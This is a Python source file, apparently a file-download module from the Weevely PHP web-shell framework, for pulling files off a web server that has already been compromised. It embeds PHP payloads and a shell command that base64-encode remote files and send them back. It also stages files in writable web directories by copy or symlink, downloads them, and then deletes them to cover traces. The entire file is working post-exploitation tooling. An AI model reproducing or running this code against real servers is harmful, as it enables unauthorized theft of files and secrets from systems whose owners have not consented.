'''
Created on 24/ago/2011

@author: norby
'''
from core.moduleguess import ModuleGuess
from core.moduleexception import  ModuleException, ExecutionException, ProbeException, ProbeSucceed
from core.http.request import Request
from base64 import b64decode
from hashlib import md5
from core.argparse import ArgumentParser
from core.utils import randstr
import os

WARN_NO_SUCH_FILE = 'No such file or permission denied'

class Download(ModuleGuess):
    '''Download binary/ascii files from the remote filesystem'''

    def _set_vectors(self):

        self.vectors.add_vector('file', 'shell.php', "print(@base64_encode(implode('', file('$rpath'))));")
        self.vectors.add_vector('fread', 'shell.php', "$f='$rpath'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));")
        self.vectors.add_vector("file_get_contents",'shell.php', "print(@base64_encode(file_get_contents('$rpath')));")
        self.vectors.add_vector("base64",'shell.sh',  "base64 -w 0 $rpath")
        self.vectors.add_vector("copy",'shell.php', "(copy('compress.zlib://$rpath','$downloadpath') && print(1)) || print(0);")
        self.vectors.add_vector("symlink", 'shell.php', "(symlink('$rpath','$downloadpath') && print(1)) || print(0);")
    
        self.support_vectors.add_vector("check_readable", 'file.check', "$rpath read".split(' '))
        self.support_vectors.add_vector("check_size", 'file.check', "$rpath size".split(' '))
        self.support_vectors.add_vector('upload2web', 'file.upload2web', '$rand -content 1'.split(' '))
        self.support_vectors.add_vector('remove', 'file.rm', '$rpath')
        self.support_vectors.add_vector('md5', 'file.check', '$rpath md5'.split(' '))
    
    def _set_args(self):
        self.argparser.add_argument('rpath')
        self.argparser.add_argument('lpath')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        
    def _prepare(self):
        self.transfer_dir = None
        self._output = 'False'

    def _prepare_vector(self):
        
        remote_path = self.args['rpath']
        self.formatted_args['rpath'] = self.args['rpath']
        
        # Check remote file existance
        if not self.support_vectors.get('check_readable').execute({'rpath' : remote_path}):
            raise ProbeException(self.name, '\'%s\' %s' % (remote_path, WARN_NO_SUCH_FILE))
        
        # Check remote file size
        remote_size = self.support_vectors.get('check_size').execute({'rpath' : remote_path})
        if remote_size == 0:

            local_path = self.args['lpath']
    
            try:
                f = open(local_path,'wb').close()
            except Exception, e:
                raise ProbeException(self.name, 'Writing %s' % (e))
            
            # Return md5 of emtpy file
            self._content = ''
            self._result = 'd41d8cd98f00b204e9800998ecf8427e'
            
            raise ProbeSucceed(self.name, 'File downloaded to \'%s\' with size 0.' % (local_path))
            

        # Vectory copy and symlink needs to search a writable directory before        
        if self.current_vector.name in ( 'copy', 'symlink' ):

                filename_temp = randstr() + remote_path.split('/').pop();
                upload_test = self.support_vectors.get('upload2web').execute({ 'rand' : filename_temp})

                if not upload_test:
                    raise ExecutionException(self.current_vector.name,'No transfer url dir found')

                self.formatted_args['downloadpath'] = upload_test[0]
                self.args['url'] = upload_test[1]

                self.support_vectors.get('remove').execute({ 'path' : self.formatted_args['downloadpath'] })

            

    def _execute_vector(self):
        
        output = self.current_vector.execute( self.formatted_args)
        
        if self.current_vector.name in ('copy', 'symlink'):

            if self.support_vectors.get('check_readable').execute({'rpath' : self.formatted_args['downloadpath']}):
                self._content = Request(self.args['url']).read()
                # Force deleting. Does not check existance, because broken links returns False
            
            self.support_vectors.get('remove').execute({'rpath' : self.formatted_args['downloadpath']})
            
        else:
            # All others encode data in b64 format
            
            try:
                self._content = b64decode(output)
            except TypeError:
                raise ExecutionException(self.current_vector.name,"Error, unexpected file content")


    def _verify_vector_execution(self):

        remote_path = self.args['rpath']
        local_path = self.args['lpath']

        try:
            f = open(local_path,'wb')
            f.write(self._content)
            f.close()
        except Exception, e:
            raise ProbeException(self.name, 'Writing %s' % (e))

        response_md5 = md5(self._content).hexdigest()
        remote_md5 = self.support_vectors.get('md5').execute({'rpath' : self.formatted_args['rpath']})

        # Consider as probe failed only MD5 mismatch
        if not remote_md5 == response_md5:
            
            if self.current_vector.name in ('copy', 'symlink') and not self.formatted_args['downloadpath'].endswith('.html') and not self.formatted_args['downloadpath'].endswith('.htm'):
                self.mprint("Transferred with '%s', rename as downloadable type as '.html' and retry" % (self.args['url']))

            self.mprint('MD5 hash mismatch: \'%s\' %s, \'%s\' %s' % ( local_path, response_md5, remote_path, remote_md5))
            raise ExecutionException(self.current_vector.name, 'file corrupt')
        
        elif not remote_md5:
            self.mprint('Remote MD5 check failed')
            
        self._result = response_md5
        
        raise ProbeSucceed(self.name, 'File downloaded to \'%s\'.' % (local_path))
    
    def _stringify_result(self):
        
        if self._result:
            self._output = 'True'
        else:
            self._output = 'False'
